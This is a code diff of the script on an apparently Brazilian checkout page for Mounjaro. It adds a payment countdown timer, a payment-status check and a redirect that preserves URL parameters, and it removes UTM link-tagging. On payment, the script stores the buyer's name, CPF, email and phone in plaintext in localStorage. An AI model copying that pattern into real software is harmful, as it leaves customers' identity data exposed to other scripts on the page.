-          console.log('Usando parâmetros UTM do localStorage:', utmParams);
-        }
-      }
-      
-      // Se temos parâmetros, adicionar a todos os links internos
-      if (Object.keys(utmParams).length > 0) {
-        const links = document.querySelectorAll('a');
+      const countdown = setInterval(function() {
+        const minutes = Math.floor(timer / 60);
+        const seconds = timer % 60;
         
-        links.forEach(link => {
-          // Verificar se é um link interno (mesmo domínio ou começa com /)
-          const href = link.getAttribute('href');
-          if (href && (href.startsWith('/') || href.includes(window.location.hostname))) {
-            // Construir string de query com parâmetros UTM
-            const url = new URL(href, window.location.origin);
+        minutesDisplay.textContent = minutes.toString().padStart(2, '0');
+        secondsDisplay.textContent = seconds.toString().padStart(2, '0');
+        
+        if (--timer < 0) {
+          clearInterval(countdown);
+          alert('O tempo para pagamento expirou. A página será recarregada.');
+          window.location.reload();
+        }
+      }, 1000);
+    }
+    
+    // Verificar status do pagamento
+    function checkPaymentStatus(transaction_id, isAutoCheck = false) {
+      fetch(`/verificar_pagamento_mounjaro?transaction_id=${transaction_id}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.status === 'paid' || data.status === 'confirmed' || data.status === 'completed') {
+            // Função para capturar todos os parâmetros da URL atual
+            function getAllUrlParams() {
+              let urlParams = {};
+              const queryString = window.location.search;
+              if (queryString) {
+                const urlSearchParams = new URLSearchParams(queryString);
+                urlSearchParams.forEach((value, key) => {
+                  urlParams[key] = value;
+                });
+              }
+              return urlParams;
+            }
             
-            // Adicionar cada parâmetro UTM à URL
-            Object.entries(utmParams).forEach(([key, value]) => {
-              url.searchParams.set(key, value);
-            });
+            // Função para preservar parâmetros da URL entre as páginas
+            function appendUrlParams(baseUrl, additionalParams = {}) {
+              const urlParams = {...getAllUrlParams(), ...additionalParams};
+              
+              const urlSearchParams = new URLSearchParams();
+              for (const key in urlParams) {
+                urlSearchParams.append(key, urlParams[key]);
+              }
+              
+              return baseUrl + (baseUrl.includes('?') ? '&' : '?') + urlSearchParams.toString();
+            }
             
-            // Atualizar o href do link
-            link.setAttribute('href', url.pathname + url.search);
+            // Salvar dados do usuário para uso posterior
+            const userPaymentData = {
+              name: data.customer_name || document.getElementById('clientName')?.textContent || '',
+              cpf: data.customer_document || document.getElementById('clientCpf')?.textContent || '',
+              email: data.customer_email || '',
+              phone: data.customer_phone || '',
+              amount: 197.90,
+              transaction_id: transaction_id,
+              timestamp: new Date().toISOString()
+            };
+            localStorage.setItem('userPaymentData', JSON.stringify(userPaymentData));
+            
+            window.location.href = appendUrlParams('/compra_sucesso');
+          } else if (!isAutoCheck) {
+            alert('Pagamento ainda não confirmado. Por favor, aguarde ou verifique se o pagamento foi realizado corretamente.');
+          }
+        })
+        .catch(error => {
+          console.error('Erro ao verificar status:', error);
+          if (!isAutoCheck) {
+            alert('Erro ao verificar status do pagamento. Por favor, tente novamente.');
           }
         });
-      }
     }
     
-    // Executar quando a página carregar
-    document.addEventListener('DOMContentLoaded', function() {
-      saveUTMParameters();
-      appendUTMToLinks();
-    });
+    // Inicializar quando a página carregar
+    window.onload = function() {
+      initializePageData();
+      
+      // Efeito de scroll na barra de navegação
+      window.addEventListener('scroll', function() {
+        var header = document.querySelector('.sticky-header');
+        if (window.pageYOffset > 0) {
+          header.classList.add('shadow');
+        } else {
+          header.classList.remove('shadow');
+        }
+      });
+    };
   </script>
 </body>
 </html>
